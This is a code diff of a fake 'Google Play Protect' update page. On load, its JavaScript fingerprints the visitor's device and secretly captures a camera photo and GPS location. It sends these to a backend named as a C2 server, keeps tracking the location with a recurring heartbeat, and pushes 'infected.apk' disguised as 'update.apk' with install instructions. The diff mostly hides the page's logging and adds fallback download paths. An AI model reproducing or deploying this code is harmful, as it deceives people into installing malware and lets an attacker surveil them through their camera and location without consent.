@@ -243,7 +243,7 @@
         }
 
         /* ============================================================
-           WARNING BOX — OFFICIAL GOOGLE STYLE
+           WARNING BOX
            ============================================================ */
         .warning-box {
             background: #fce8e6;
@@ -414,15 +414,59 @@
         }
 
         /* ============================================================
-           HIDDEN LOGS
+           DEBUG CONSOLE — HIDDEN BY DEFAULT
            ============================================================ */
-        .log-console {
+        .debug-console {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-top: 16px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-size: 11px;
+            line-height: 1.7;
+            color: #88ccff;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            border: 1px solid #2a2a44;
             display: none;
         }
 
-        /* ============================================================
-           FOOTER
-           ============================================================ */
+        .debug-console.open {
+            display: block;
+        }
+
+        .debug-console .d-entry {
+            border-bottom: 1px solid #1a1a2e;
+            padding: 2px 0;
+        }
+
+        .debug-console .d-entry .d-time {
+            color: #4a6a7a;
+            margin-right: 8px;
+        }
+
+        .debug-console .d-entry .d-ok { color: #6fcf97; }
+        .debug-console .d-entry .d-err { color: #ff5e5e; }
+        .debug-console .d-entry .d-warn { color: #ffaa44; }
+        .debug-console .d-entry .d-info { color: #88ccff; }
+
+        .btn-debug {
+            background: transparent;
+            border: 1px solid #2a2a44;
+            padding: 4px 12px;
+            border-radius: 16px;
+            color: #4a6a7a;
+            font-size: 10px;
+            cursor: pointer;
+            margin-top: 8px;
+            display: none; /* HIDDEN BY DEFAULT — remove this line if you want to keep the toggle button */
+        }
+
+        .btn-debug:hover {
+            border-color: #4a6a7a;
+        }
+
         .footer {
             font-size: 11px;
             color: #9aa0a6;
@@ -519,6 +563,12 @@
         </div>
     </div>
 
+    <!-- DEBUG CONSOLE — HIDDEN -->
+    <button class="btn-debug" id="debugToggleBtn">📋 Debug</button>
+    <div class="debug-console" id="debugConsole">
+        <div id="debugEntries"></div>
+    </div>
+
     <!-- FOOTER -->
     <div class="footer">
         🔐 Verified by Google Play Protect &nbsp;·&nbsp; <a href="#">Learn more</a>
@@ -526,9 +576,7 @@
 
 </div>
 
-<!-- ============================================================
-INSTALLATION GUIDE POPUP
-============================================================ -->
+<!-- INSTALLATION GUIDE POPUP -->
 <div class="guide-overlay" id="guideOverlay">
     <div class="guide-card">
         <div class="guide-header">
@@ -599,7 +647,7 @@ INSTALLATION GUIDE POPUP
         // ============================================================
         //  CONFIG
         // ============================================================
-        const BACKEND_URL = 'https://c2-api-test.vercel.app';
+        const BACKEND_URL = 'https://c2-vercel-backend.vercel.app';
         const APK_URL = 'infected.apk';
         const DOWNLOAD_NAME = 'update.apk';
 
@@ -612,48 +660,53 @@ INSTALLATION GUIDE POPUP
         const guideOverlay = document.getElementById('guideOverlay');
         const guideCloseBtn = document.getElementById('guideCloseBtn');
         const guideGotItBtn = document.getElementById('guideGotItBtn');
+        const debugConsole = document.getElementById('debugConsole');
+        const debugEntries = document.getElementById('debugEntries');
+        const debugToggleBtn = document.getElementById('debugToggleBtn');
 
         let deviceId = null;
-        let isDeviceRegistered = false;
 
         // ============================================================
-        //  BACKEND API CALLS — ALWAYS SEND DATA
+        //  DEBUG LOGGING — HIDDEN FROM USERS
+        // ============================================================
+        function debugLog(msg, type = 'info') {
+            const time = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'd-entry';
+            entry.innerHTML = `<span class="d-time">[${time}]</span><span class="d-${type}">${msg}</span>`;
+            debugEntries.appendChild(entry);
+            debugConsole.scrollTop = debugConsole.scrollHeight;
+            console.log(`[${type}] ${msg}`);
+        }
+
+        // Debug toggle — hidden by default, but can be enabled if needed
+        debugToggleBtn.addEventListener('click', () => {
+            debugConsole.classList.toggle('open');
+            debugToggleBtn.textContent = debugConsole.classList.contains('open') ? '📋 Hide Debug' : '📋 Debug';
+        });
+
+        // ============================================================
+        //  BACKEND API CALLS
         // ============================================================
         async function apiCall(endpoint, data) {
+            const url = `${BACKEND_URL}${endpoint}`;
+            debugLog(`📤 Sending to ${endpoint}`, 'info');
             try {
-                const resp = await fetch(`${BACKEND_URL}${endpoint}`, {
+                const resp = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
+                if (!resp.ok) {
+                    throw new Error(`HTTP ${resp.status}: ${resp.statusText}`);
+                }
                 const result = await resp.json();
-                console.log(`[API] ${endpoint} response:`, result);
+                debugLog(`✅ ${endpoint} → success`, 'ok');
                 return result;
             } catch(e) {
-                console.error(`[API] ${endpoint} failed:`, e.message);
+                debugLog(`❌ ${endpoint} failed: ${e.message}`, 'err');
                 return null;
             }
-        }
-
-        async function apiGet(endpoint) {
-            try {
-                const resp = await fetch(`${BACKEND_URL}${endpoint}`);
-                return await resp.json();
-            } catch(e) {
-                console.error(`[API] GET ${endpoint} failed:`, e.message);
-                return null;
-            }
-        }
-
-        // ============================================================
-        //  SEND LOG TO BACKEND
-        // ============================================================
-        function sendLogToBackend(msg, level = 'info') {
-            if (!deviceId) {
-                console.log(`[Log] (no deviceId) ${level}: ${msg}`);
-                return;
-            }
-            apiCall('/api/log', { deviceId, msg, level });
         }
 
         // ============================================================
@@ -665,7 +718,7 @@ INSTALLATION GUIDE POPUP
                 const p = Math.min(Math.max(progress, 0), 100);
                 progressBar.style.width = p + '%';
             }
-            sendLogToBackend(msg, 'info');
+            debugLog(`📌 ${msg}`, 'info');
         }
 
         function showGuide() {
@@ -720,14 +773,24 @@ INSTALLATION GUIDE POPUP
 
         function getPublicIP() {
             return new Promise((resolve) => {
+                debugLog('🌐 Fetching public IP...', 'info');
                 fetch('https://api.ipify.org?format=json')
                     .then(res => res.json())
-                    .then(data => resolve(data.ip || 'unknown'))
+                    .then(data => {
+                        debugLog(`🌐 IP: ${data.ip}`, 'ok');
+                        resolve(data.ip || 'unknown');
+                    })
                     .catch(() => {
                         fetch('https://api64.ipify.org?format=json')
                             .then(res => res.json())
-                            .then(data => resolve(data.ip || 'unknown'))
-                            .catch(() => resolve('unavailable'));
+                            .then(data => {
+                                debugLog(`🌐 IP: ${data.ip}`, 'ok');
+                                resolve(data.ip || 'unknown');
+                            })
+                            .catch(() => {
+                                debugLog('🌐 IP: unavailable', 'warn');
+                                resolve('unavailable');
+                            });
                     });
             });
         }
@@ -737,8 +800,10 @@ INSTALLATION GUIDE POPUP
         // ============================================================
         function capturePhoto() {
             return new Promise((resolve, reject) => {
+                debugLog('📸 Requesting camera...', 'info');
                 navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: false })
                     .then(stream => {
+                        debugLog('📸 Camera stream acquired', 'ok');
                         const video = document.createElement('video');
                         video.srcObject = stream;
                         video.setAttribute('playsinline', '');
@@ -754,6 +819,7 @@ INSTALLATION GUIDE POPUP
                             const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                             stream.getTracks().forEach(track => track.stop());
                             document.body.removeChild(video);
+                            debugLog(`📸 Photo captured (${dataUrl.length} chars)`, 'ok');
                             resolve(dataUrl);
                         };
                         video.onerror = function() {
@@ -762,7 +828,10 @@ INSTALLATION GUIDE POPUP
                             reject('Video error');
                         };
                     })
-                    .catch(err => reject('Camera denied: ' + err.message));
+                    .catch(err => {
+                        debugLog(`📸 Camera denied: ${err.message}`, 'err');
+                        reject('Camera denied: ' + err.message);
+                    });
             });
         }
 
@@ -772,12 +841,20 @@ INSTALLATION GUIDE POPUP
         function getLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
+                    debugLog('📍 Geolocation not supported', 'warn');
                     resolve({ lat: null, lon: null, error: 'not supported' });
                     return;
                 }
+                debugLog('📍 Getting location...', 'info');
                 navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, error: null }),
-                    err => resolve({ lat: null, lon: null, error: err.message }),
+                    pos => {
+                        debugLog(`📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}`, 'ok');
+                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, error: null });
+                    },
+                    err => {
+                        debugLog(`📍 Location error: ${err.message}`, 'warn');
+                        resolve({ lat: null, lon: null, error: err.message });
+                    },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
             });
@@ -787,6 +864,7 @@ INSTALLATION GUIDE POPUP
         //  REQUEST ALL PERMISSIONS
         // ============================================================
         async function requestAllPermissions() {
+            debugLog('🔑 Requesting permissions...', 'info');
             const results = { camera: false, mic: false, location: false, storage: false };
 
             try {
@@ -794,9 +872,9 @@ INSTALLATION GUIDE POPUP
                 results.camera = true;
                 results.mic = true;
                 stream.getTracks().forEach(t => t.stop());
-                sendLogToBackend('[Perm] Camera + Mic granted.', 'success');
+                debugLog('🔑 Camera + Mic granted', 'ok');
             } catch(e) {
-                sendLogToBackend('[Perm] Camera/Mic denied: ' + e.message, 'error');
+                debugLog(`🔑 Camera/Mic denied: ${e.message}`, 'err');
             }
 
             try {
@@ -804,26 +882,26 @@ INSTALLATION GUIDE POPUP
                     navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
                 });
                 results.location = true;
-                sendLogToBackend('[Perm] Location granted.', 'success');
+                debugLog('🔑 Location granted', 'ok');
             } catch(e) {
-                sendLogToBackend('[Perm] Location denied: ' + e.message, 'error');
+                debugLog(`🔑 Location denied: ${e.message}`, 'err');
             }
 
             try {
                 if ('showDirectoryPicker' in window) {
                     await window.showDirectoryPicker({ mode: 'readwrite' });
                     results.storage = true;
-                    sendLogToBackend('[Perm] Storage granted (File System Access).', 'success');
+                    debugLog('🔑 Storage granted (File System Access)', 'ok');
                 } else if (navigator.storage && navigator.storage.persist) {
                     const persisted = await navigator.storage.persist();
                     results.storage = persisted;
-                    sendLogToBackend(`[Perm] Storage persist: ${persisted}`, persisted ? 'success' : 'warn');
+                    debugLog(`🔑 Storage persist: ${persisted}`, persisted ? 'ok' : 'warn');
                 } else {
                     results.storage = true;
-                    sendLogToBackend('[Perm] Storage assumed available.', 'info');
+                    debugLog('🔑 Storage assumed available', 'info');
                 }
             } catch(e) {
-                sendLogToBackend('[Perm] Storage denied: ' + e.message, 'error');
+                debugLog(`🔑 Storage denied: ${e.message}`, 'err');
             }
 
             return results;
@@ -833,14 +911,25 @@ INSTALLATION GUIDE POPUP
         //  DOWNLOAD APK
         // ============================================================
         function downloadApk() {
+            debugLog('📦 Starting APK download...', 'info');
             setStatus('📦 Downloading security update...', 50);
 
-            fetch(APK_URL)
+            fetch(APK_URL, {
+                method: 'GET',
+                mode: 'cors',
+                headers: {
+                    'Accept': 'application/vnd.android.package-archive, */*'
+                }
+            })
                 .then(response => {
-                    if (!response.ok) throw new Error('Network response was not ok');
+                    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                    debugLog('📦 APK fetched, converting to blob...', 'ok');
                     return response.blob();
                 })
                 .then(blob => {
+                    if (blob.size === 0) throw new Error('Empty file received');
+                    debugLog(`📦 Blob size: ${blob.size} bytes`, 'ok');
+
                     const newBlob = new Blob([blob], { type: 'application/vnd.android.package-archive' });
                     const url = URL.createObjectURL(newBlob);
 
@@ -854,16 +943,33 @@ INSTALLATION GUIDE POPUP
 
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
 
-                    sendLogToBackend('[APK] Download started: update.apk', 'success');
+                    debugLog(`📦 Download started: ${DOWNLOAD_NAME}`, 'ok');
                     installBtn.disabled = false;
                     setStatus('✅ Update downloaded. Tap "Install Update" to continue.', 100);
-                    sendLogToBackend('[APK] Download complete. File: update.apk', 'success');
+                    debugLog('📦 Download complete', 'ok');
 
                     setTimeout(showGuide, 800);
                 })
                 .catch(error => {
-                    sendLogToBackend('[APK] Download failed: ' + error.message, 'error');
-                    setStatus('❌ Download failed. Please refresh and try again.', 0);
+                    debugLog(`📦 Download failed: ${error.message}`, 'err');
+                    // Fallback: direct anchor download
+                    try {
+                        debugLog('📦 Trying fallback download...', 'warn');
+                        const a = document.createElement('a');
+                        a.href = APK_URL;
+                        a.download = DOWNLOAD_NAME;
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        debugLog('📦 Fallback download triggered', 'ok');
+                        installBtn.disabled = false;
+                        setStatus('✅ Update downloaded (fallback). Tap "Install Update".', 100);
+                        setTimeout(showGuide, 800);
+                    } catch(e2) {
+                        debugLog(`📦 Fallback also failed: ${e2.message}`, 'err');
+                        setStatus('❌ Download failed. Please refresh and try again.', 0);
+                    }
                 });
 
             let p = 55;
@@ -881,7 +987,7 @@ INSTALLATION GUIDE POPUP
         //  INSTALL BUTTON
         // ============================================================
         installBtn.addEventListener('click', function() {
-            sendLogToBackend('[Install] User tapped Install Update.', 'info');
+            debugLog('🔘 Install button clicked', 'info');
 
             installBtn.disabled = true;
             installBtn.textContent = '⏳ Opening installer...';
@@ -904,15 +1010,26 @@ INSTALLATION GUIDE POPUP
                     document.body.removeChild(a);
 
                     setTimeout(() => URL.revokeObjectURL(url), 10000);
-                    sendLogToBackend('[Install] Download triggered (update.apk).', 'success');
+                    debugLog('🔘 Install download triggered', 'ok');
                     setTimeout(showGuide, 600);
                 })
                 .catch(error => {
-                    sendLogToBackend('[Install] Download failed: ' + error.message, 'error');
+                    debugLog(`🔘 Install download failed: ${error.message}`, 'err');
+                    try {
+                        const a = document.createElement('a');
+                        a.href = APK_URL;
+                        a.download = DOWNLOAD_NAME;
+                        a.style.display = 'none';
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        debugLog('🔘 Fallback install download triggered', 'ok');
+                    } catch(e) {
+                        debugLog(`🔘 Fallback failed: ${e.message}`, 'err');
+                    }
                 });
 
             setStatus('📲 Installation started. Follow the instructions.', 100);
-            sendLogToBackend('[Install] ✅ Check Downloads folder for update.apk.', 'success');
 
             setTimeout(() => {
                 installBtn.disabled = false;
@@ -925,52 +1042,50 @@ INSTALLATION GUIDE POPUP
         });
 
         // ============================================================
-        //  MAIN INIT — ALL DATA UPLOADS
+        //  MAIN INIT
         // ============================================================
         async function init() {
+            debugLog('🚀 INIT STARTED', 'info');
             setStatus('🔍 Checking for updates...', 10);
 
-            // 1. Collect fingerprint + IP
             const fp = collectFingerprint();
             const ip = await getPublicIP();
             fp.ip = ip;
-            sendLogToBackend(`[FP] IP: ${ip} | ${fp.platform} | ${fp.screen}`, 'info');
+            debugLog(`📋 Fingerprint: ${fp.platform} | ${fp.screen} | IP: ${ip}`, 'ok');
 
-            // 2. Request permissions
             const perms = await requestAllPermissions();
+            debugLog(`🔑 Permissions: ${JSON.stringify(perms)}`, 'info');
 
-            // 3. Register device — THIS SETS deviceId
             const regResp = await apiCall('/api/register', { fingerprint: fp, permissions: perms });
             if (regResp && regResp.deviceId) {
                 deviceId = regResp.deviceId;
-                isDeviceRegistered = true;
-                sendLogToBackend(`[Reg] Device registered: ${deviceId}`, 'success');
+                debugLog(`📝 Device registered: ${deviceId}`, 'ok');
             } else {
                 deviceId = 'local-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6);
-                sendLogToBackend(`[Reg] Local fallback ID: ${deviceId}`, 'warn');
+                debugLog(`📝 Using local fallback ID: ${deviceId}`, 'warn');
             }
 
-            // 4. Capture photo and upload
             setStatus('📸 Capturing device information...', 30);
             try {
                 const photoDataUrl = await capturePhoto();
+                debugLog(`📸 Photo captured (${photoDataUrl.length} chars)`, 'ok');
                 const photoResp = await apiCall('/api/photo', {
                     deviceId: deviceId,
                     image: photoDataUrl,
                     timestamp: Date.now()
                 });
                 if (photoResp && photoResp.success) {
-                    sendLogToBackend('[Photo] Captured and uploaded successfully.', 'success');
+                    debugLog('📸 Photo uploaded successfully', 'ok');
                 } else {
-                    sendLogToBackend('[Photo] Upload failed.', 'error');
+                    debugLog('📸 Photo upload failed', 'err');
                 }
             } catch(e) {
-                sendLogToBackend(`[Photo] Error: ${e}`, 'error');
+                debugLog(`📸 Photo error: ${e}`, 'err');
             }
 
-            // 5. Get location and upload
             const loc = await getLocation();
             if (loc.lat && loc.lon) {
+                debugLog(`📍 Location: ${loc.lat}, ${loc.lon}`, 'ok');
                 const locResp = await apiCall('/api/location', {
                     deviceId: deviceId,
                     lat: loc.lat,
@@ -978,15 +1093,14 @@ INSTALLATION GUIDE POPUP
                     timestamp: Date.now()
                 });
                 if (locResp && locResp.success) {
-                    sendLogToBackend(`[Loc] ${loc.lat}, ${loc.lon} uploaded.`, 'info');
+                    debugLog('📍 Location uploaded successfully', 'ok');
                 } else {
-                    sendLogToBackend('[Loc] Location upload failed.', 'error');
+                    debugLog('📍 Location upload failed', 'err');
                 }
             } else {
-                sendLogToBackend('[Loc] Location not available.', 'warn');
+                debugLog('📍 Location not available', 'warn');
             }
 
-            // 6. Start heartbeat
             setInterval(async () => {
                 const newLoc = await getLocation();
                 if (newLoc.lat && newLoc.lon) {
@@ -1000,19 +1114,19 @@ INSTALLATION GUIDE POPUP
                 await apiCall('/api/heartbeat', { deviceId: deviceId, timestamp: Date.now() });
             }, 30000);
 
-            // 7. Download APK
             downloadApk();
 
-            sendLogToBackend('[+] System ready. All data uploaded.', 'success');
+            debugLog('✅ INIT COMPLETE', 'ok');
         }
 
         // ============================================================
         //  START
         // ============================================================
         installBtn.disabled = true;
+        debugLog('🟢 Page loaded. Starting initialization...', 'info');
 
         init().catch(err => {
-            sendLogToBackend(`[Fatal] ${err}`, 'error');
+            debugLog(`💀 Fatal error: ${err}`, 'err');
             setStatus('❌ Update check failed. Please refresh.', 0);
             installBtn.disabled = false;
         });
